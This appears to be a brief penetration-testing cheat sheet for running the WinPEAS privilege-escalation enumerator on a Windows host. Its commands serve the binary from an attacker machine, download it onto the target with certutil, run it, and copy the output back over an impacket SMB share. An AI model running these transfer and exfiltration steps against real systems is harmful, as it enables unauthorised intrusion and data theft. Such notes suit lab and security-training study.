
# WINPEAS
```shell
wget https://github.com/peass-ng/PEASS-ng/releases/download/20241101-6f46e855/winPEASx64.exe
python3 -m http.server 80
PS C:\Windows\Temp\peas> certutil.exe -f -urlcache -split http://192.168.45.189/winPEASx64.exe winPEAS.exe
PS C:\Windows\Temp\peas> .\winPEAS.exe > output.txt

❯ sudo impacket-smbserver smbFolder $(pwd) -smb2support
PS C:\Windows\Temp\peas> copy output.txt \\192.168.45.223\smbFolder\output.txt
```